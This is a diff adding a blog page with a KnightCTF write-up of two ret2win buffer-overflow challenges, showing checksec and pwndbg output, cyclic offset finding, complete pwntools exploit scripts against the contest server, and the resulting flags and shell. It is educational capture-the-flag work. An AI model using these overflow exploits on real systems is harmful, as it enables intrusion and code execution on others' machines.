@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>KnightCTF | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">KnightCTF</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents"></nav>
+</details>
+				<div class="entry__content"><h1 id="get-the-sword">Get The Sword</h1>
+<pre tabindex="0"><code>Can you get the sword ?
+Author : froghunter
+Download Link - 1 : https://drive.google.com/file/d/1HsQMxiZlP5978DzqnoZs6g6QOnCzVm_G/view
+</code></pre><p>Doing some basic file checks we see that the binary is a 32bit LSB executable which will really affect how we approach this challenge. The binary is also dynamically linked and not stripped.</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ file get_sword
+get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped
+</code></pre><p>Now looking at the securities set with the binary, we see that it really is not protected. We have no canary, meaning we can perform a buffer overflow with ease. NX is also unkown which would make executing shellcode on the stack very possible. Also there is No Pie which would mean that the addresses will remain the same every time the binary is ran.</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ checksec get_sword
+[*] &#39;/home/dexter/the-lab/knights/rev/get_sword&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x8048000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+</code></pre><p>With that knowledge we can now fire up <code>gdb</code> and see how the binary works.</p>
+<pre tabindex="0"><code>pwndbg&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08049000  _init
+0x08049040  __libc_start_main@plt
+0x08049050  printf@plt
+0x08049060  fflush@plt
+0x08049070  puts@plt
+0x08049080  system@plt
+0x08049090  __isoc99_scanf@plt
+0x080490a0  _start
+0x080490e0  _dl_relocate_static_pie
+0x080490f0  __x86.get_pc_thunk.bx
+0x080491b6  printSword
+0x08049218  getSword
+0x08049256  intro
+0x080492c0  main
+0x080492e1  __x86.get_pc_thunk.ax
+0x080492e8  _fini
+pwndbg&gt;
+</code></pre><p>Interesting, according to the challenge name (get the sword) we see a function <code>getSword</code>, well that is an interesting function. But before we get there, let us disassemble the main function.</p>
+<pre tabindex="0"><code>pwndbg&gt; disass main
+Dump of assembler code for function main:
+   0x080492c0 &lt;+0&gt;:     push   ebp
+   0x080492c1 &lt;+1&gt;:     mov    ebp,esp
+   0x080492c3 &lt;+3&gt;:     and    esp,0xfffffff0
+   0x080492c6 &lt;+6&gt;:     call   0x80492e1 &lt;__x86.get_pc_thunk.ax&gt;
+   0x080492cb &lt;+11&gt;:    add    eax,0x2d29
+   0x080492d0 &lt;+16&gt;:    call   0x80491b6 &lt;printSword&gt;
+   0x080492d5 &lt;+21&gt;:    call   0x8049256 &lt;intro&gt;
+   0x080492da &lt;+26&gt;:    mov    eax,0x0
+   0x080492df &lt;+31&gt;:    leave
+   0x080492e0 &lt;+32&gt;:    ret
+End of assembler dump.
+</code></pre><p>Okay so now looking at this we can see that main does not really call the function <code>getSword</code>. So this can confirm that it is a win function. Awesome let us now dig for our buffer which will enable us to overwrite adjacent memory.</p>
+<p>Using cyclic to generate a pattern ..</p>
+<pre tabindex="0"><code>pwndbg&gt; cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+pwndbg&gt; r
+Starting program: /home/dexter/the-lab/knights/rev/get_sword
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+      /&gt;_________________________________
+[#####[]_________________________________&gt;
+      \&gt;
+What do you want ? ?: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+You want, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616169 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
+*EAX  0x6f
+*EBX  0x61616167 (&#39;gaaa&#39;)
+*ECX  0xffffcc8c ◂— 0x5d67b300
+*EDX  0x1
+*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
+*ESI  0x804bef8 —▸ 0x8049180 ◂— endbr32
+*EBP  0x61616168 (&#39;haaa&#39;)
+*ESP  0xffffcd10 ◂— &#39;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+*EIP  0x61616169 (&#39;iaaa&#39;)
+──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────
+Invalid address 0x61616169
+
+
+
+
+
+
+
+
+
+
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffcd10 ◂— &#39;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+01:0004│     0xffffcd14 ◂— &#39;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+02:0008│     0xffffcd18 ◂— &#39;laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+03:000c│     0xffffcd1c ◂— &#39;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+04:0010│     0xffffcd20 ◂— &#39;naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+05:0014│     0xffffcd24 ◂— &#39;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+06:0018│     0xffffcd28 ◂— &#39;paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+07:001c│     0xffffcd2c ◂— &#39;qaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0 0x61616169
+   1 0x6161616a
+   2 0x6161616b
+   3 0x6161616c
+   4 0x6161616d
+   5 0x6161616e
+   6 0x6161616f
+   7 0x61616170
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt;
+</code></pre><p>The binary faults obviously and now we can get the offset. So now we can grab whatever was in our instruction pointer and get the offset.</p>
+<pre tabindex="0"><code>pwndbg&gt; cyclic -l iaaa
+Finding cyclic pattern of 4 bytes: b&#39;iaaa&#39; (hex: 0x69616161)
+Found at offset 32
+</code></pre><p>With that we can now craft our exploit.</p>
+<pre tabindex="0"><code>from pwn import *
+
+binary = context.binary = ELF(&#34;./get_sword&#34;, checksec=False)
+
+p = remote(&#34;173.255.201.51&#34;, 31337)
+
+buffer = b&#39;A&#39; * 32
+
+win = binary.sym.getSword
+
+ret = p32(0x0804900e)
+
+payload = buffer
+payload += p32(win)
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p>Probably wondering what the elf stuff is &hellip;.</p>
+<p>ELF: refers to the Executable and Linkable Format, which is a common file format for executables, object code, shared libraries, and even core dumps on Unix systems. It&rsquo;s commonly used for programs on Linux systems.</p>
+<p>&ldquo;./get_sword&rdquo;: This is the path to an ELF binary file named &ldquo;get_sword.&rdquo;</p>
+<p>checksec=False: related to a tool used for analyzing the security features of an ELF binary. Setting checksec to False means that the security features of the binary are not being checked.</p>
+<p>binary = context.binary: assign the ELF binary to a variable named binary within a context or environment.</p>
+<p>Basically it helps to input addresess in the binary automatically, helps alot when the binary has pie enabled, no harm is done when there is No PIE.</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ python3 solve.py
+[+] Opening connection to 173.255.201.51 on port 31337: Done
+[*] Switching to interactive mode
+      /&gt;_________________________________
+[#####[]_________________________________&gt;
+      \&gt;
+What do you want ? ?: KCTF{so_you_g0t_the_sw0rd}
+</code></pre><h1 id="winwinwindow">Win..Win..Window</h1>
+<pre tabindex="0"><code>You are a skilled hacker known for your expertise in binary exploitation. One day, you receive an anonymous message challenging your abilities. The message contains a mysterious binary file. Now you decide to analyze the file.
+
+Attachment 1
+Attachment 2
+Attachment 3
+
+Flag Format: KCTF{S0m3th1ng_h3re}
+
+Author: Pratham Naik (YCF)
+</code></pre><p>Second challenge and the title already gives you an idea that it is also a ret2win challenge.</p>
+<p>Doing some basic file checks this time we are working with 64-bit executable. Ha! they only changed that but the solve process remains the same</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ file win
+win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f5ac48d36515bfa0e2e4f62a9e57ee7510516169, for GNU/Linux 4.4.0, not stripped
+</code></pre><p>Let us check the securities, and the only difference here is that NX is enabled, meaning that we cannot execute shellcode on the stack.</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ checksec win
+[*] &#39;/home/dexter/the-lab/knights/rev/win&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>With that we can then step into a debugger and get more information.</p>
+<pre tabindex="0"><code>pwndbg&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401030  puts@plt
+0x0000000000401040  system@plt
+0x0000000000401050  gets@plt
+0x0000000000401060  fflush@plt
+0x0000000000401070  _start
+0x00000000004010a0  _dl_relocate_static_pie
+0x0000000000401156  shell
+0x000000000040118a  main
+0x00000000004011d0  _fini
+</code></pre><p>You see already where this is going. We have a function called <code>shell</code> which my guess does some system call.</p>
+<pre tabindex="0"><code>pwndbg&gt; disass shell
+Dump of assembler code for function shell:
+   0x0000000000401156 &lt;+0&gt;:     push   rbp
+   0x0000000000401157 &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040115a &lt;+4&gt;:     lea    rax,[rip+0xea7]        # 0x402008
+   0x0000000000401161 &lt;+11&gt;:    mov    rdi,rax
+   0x0000000000401164 &lt;+14&gt;:    call   0x401030 &lt;puts@plt&gt;
+   0x0000000000401169 &lt;+19&gt;:    lea    rax,[rip+0xead]        # 0x40201d
+   0x0000000000401170 &lt;+26&gt;:    mov    rdi,rax
+   0x0000000000401173 &lt;+29&gt;:    call   0x401030 &lt;puts@plt&gt;
+   0x0000000000401178 &lt;+34&gt;:    lea    rax,[rip+0xea7]        # 0x402026
+   0x000000000040117f &lt;+41&gt;:    mov    rdi,rax
+   0x0000000000401182 &lt;+44&gt;:    call   0x401040 &lt;system@plt&gt;
+   0x0000000000401187 &lt;+49&gt;:    nop
+   0x0000000000401188 &lt;+50&gt;:    pop    rbp
+   0x0000000000401189 &lt;+51&gt;:    ret
+End of assembler dump.
+</code></pre><p>Oow would you look at that, how convenient.</p>
+<p>We can then check the offset using cyclic.</p>
+<pre tabindex="0"><code>pwndbg&gt; r
+Starting program: /home/dexter/the-lab/knights/rev/win
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+Can u find me ? i dont think so...!
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004011ce in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x0
+*RBX  0x7fffffffdc28 —▸ 0x7fffffffdfe3 ◂— &#39;/home/dexter/the-lab/knights/rev/win&#39;
+*RCX  0x7ffff7f9daa0 (_IO_2_1_stdin_) ◂— 0xfbad2288
+ RDX  0x0
+*RDI  0x7ffff7f9fa40 (_IO_stdfile_0_lock) ◂— 0x0
+*RSI  0x4056b1 ◂— &#39;aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&#39;
+*R8   0x405715 ◂— 0x0
+ R9   0x0
+*R10  0x1000
+*R11  0x246
+ R12  0x0
+*R13  0x7fffffffdc38 —▸ 0x7fffffffe008 ◂— 0x5245545f5353454c (&#39;LESS_TER&#39;)
+*R14  0x403df0 —▸ 0x401120 ◂— endbr64
+*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
+*RBP  0x6163616161616161 (&#39;aaaaaaca&#39;)
+*RSP  0x7fffffffdb18 ◂— &#39;aaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+*RIP  0x4011ce (main+68) ◂— ret
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x4011ce &lt;main+68&gt;    ret    &lt;0x6164616161616161&gt;
+
+
+
+
+
+
+
+
+
+
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdb18 ◂— &#39;aaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+01:0008│     0x7fffffffdb20 ◂— &#39;aaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+02:0010│     0x7fffffffdb28 ◂— &#39;aaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+03:0018│     0x7fffffffdb30 ◂— &#39;aaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+04:0020│     0x7fffffffdb38 ◂— &#39;aaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+05:0028│     0x7fffffffdb40 ◂— &#39;aaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+06:0030│     0x7fffffffdb48 ◂— &#39;aaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&#39;
+07:0038│     0x7fffffffdb50 ◂— &#39;aaaaaakaaaaaaalaaaaaaamaaa&#39;
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4011ce main+68
+   1 0x6164616161616161
+   2 0x6165616161616161
+   3 0x6166616161616161
+   4 0x6167616161616161
+   5 0x6168616161616161
+   6 0x6169616161616161
+   7 0x616a616161616161
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt;
+</code></pre><p>This time we are going to pick the pattern that was stored in <code>rbp</code> and then we are going to add 8 bytes in order to be able to write adjacent memory from the stack pointer.</p>
+<pre tabindex="0"><code>pwndbg&gt; cyclic -l aaaaaaca
+Finding cyclic pattern of 8 bytes: b&#39;aaaaaaca&#39; (hex: 0x6161616161616361)
+Found at offset 10
+</code></pre><p>This would bring our offset to 18. Ideally we also need to check for a ret gadget since By overwriting the return address on the stack with the address of a ret gadget, we can control where the program execution will continue. And we want the flow to our win (shell) function.</p>
+<p>With that we can craft our payload</p>
+<pre tabindex="0"><code>from pwn import *
+
+binary = context.binary = ELF(&#34;./win&#34;, checksec=False)
+
+# p = process()
+p = remote(&#34;173.255.201.51&#34;, 3337)
+
+buffer = b&#39;A&#39; * 18
+win = p64(0x0401156)
+ret = p64(0x040101a)
+
+payload = buffer
+payload += ret
+payload += win
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p>Noice&hellip;&hellip;</p>
+<pre tabindex="0"><code>dexter@lab:~/the-lab/knights/rev$ python3 solve_win.py
+[+] Opening connection to 173.255.201.51 on port 3337: Done
+[*] Switching to interactive mode
+Can u find me ? i dont think so...!
+$ id
+uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
+$ ls
+flag.txt
+win
+ynetd
+$ cat flag.txt
+KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}
+</code></pre></div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/tags/knightctf/">KnightCTF</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=%2f%2flocalhost%3a1313%2fposts%2fctfs%2f&title=KnightCTF" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
